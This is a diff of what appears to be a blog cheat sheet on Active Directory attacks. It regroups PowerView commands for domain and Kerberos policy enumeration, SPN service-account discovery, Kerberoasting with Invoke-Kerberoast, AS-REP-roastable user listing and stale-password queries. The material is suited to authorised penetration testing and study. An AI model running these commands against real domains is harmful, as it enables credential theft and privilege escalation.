@@ -9,11 +9,11 @@ permalink: /:categories/:title/
 ---
 
 <!-- vscode-markdown-toc -->
-* [ENUM: DOMAIN](#ENUM:DOMAIN)
-* [T1046 SERVICES LOOTS](#T1046SERVICESLOOTS)
-* [TXXXX Credentials Dumping](#TXXXXCredentialsDumping)
+* [ENUM: KRB DOMAIN POLICIES](#ENUM:KRBDOMAINPOLICIES)
+* [ENUM: TARGETS](#ENUM:TARGETS)
 	* [Kerberoasting](#Kerberoasting)
 	* [AS-REPoasting](#AS-REPoasting)
+	* [User Accounts Status](#UserAccountsStatus)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -21,8 +21,11 @@ permalink: /:categories/:title/
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-## <a name='ENUM:DOMAIN'></a>ENUM: DOMAIN
+## <a name='ENUM:KRBDOMAINPOLICIES'></a>PREREQ: WHICH OS ? WHAT CREDS ?
 
+![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
+
+## <a name='ENUM:KRBDOMAINPOLICIES'></a>ENUM: KRB DOMAIN POLICIES
 ```powershell
 Get-NetDomainController
 
@@ -34,11 +37,14 @@ $DCPolicy.PrivilegeRights # user privilege rights on the dc...
 $DomainPolicy = Get-DomainPolicy -Policy Domain
 $DomainPolicy.KerberosPolicy # useful for golden tickets
 $DomainPolicy.SystemAccess # password age/etc.
+
+# get the domain policy settings for the passwords: history, complexicity, lockout, clear-text
+(Get-DomainPolicy)."system access"
 ```
 
+## <a name='ENUM:TARGETS'></a>ENUM: TARGETS
 
-## <a name='T1046SERVICESLOOTS'></a>T1046 SERVICES LOOTS
-
+### <a name='Kerberoasting'></a>Kerberoasting
 ```powershell
 # find all users with an SPN set (likely service accounts)
 Get-DomainUser -SPN | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof
@@ -46,23 +52,6 @@ Get-DomainUser -SPN | select name, description, lastlogon, badpwdcount, logoncou
 # find all service accounts in "Domain Admins"
 Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
 
-```
-
-## <a name='TXXXXCredentialsDumping'></a>TXXXX Credentials Dumping
-```powershell
-# get the domain policy settings for the passwords: history, complexicity, lockout, clear-text
-(Get-DomainPolicy)."system access"
-
-# get all users with passwords changed > 1 year ago, returning sam account names and password last set times
-$Date = (Get-Date).AddYears(-1).ToFileTime()
-Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset,useraccountcontrol
-
-# get the last password set of each user in the current domain
-Get-UserProperty -Properties pwdlastset
-```
-
-### <a name='Kerberoasting'></a>Kerberoasting
-```powershell
 # Kerberoast any users in a particular OU with SPNs set
 Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
 ```
@@ -73,6 +62,15 @@ Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
 Get-DomainUser -PreauthNotRequired
 Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
+
+### <a name='UserAccountsStatus'></a>User Accounts Status
+```powershell
+# get all users with passwords changed > 1 year ago, returning sam account names and password last set times
+$Date = (Get-Date).AddYears(-1).ToFileTime()
+Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset,useraccountcontrol
+
+# get the last password set of each user in the current domain
+Get-UserProperty -Properties pwdlastset
 
 # all users that require smart card authentication
 Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
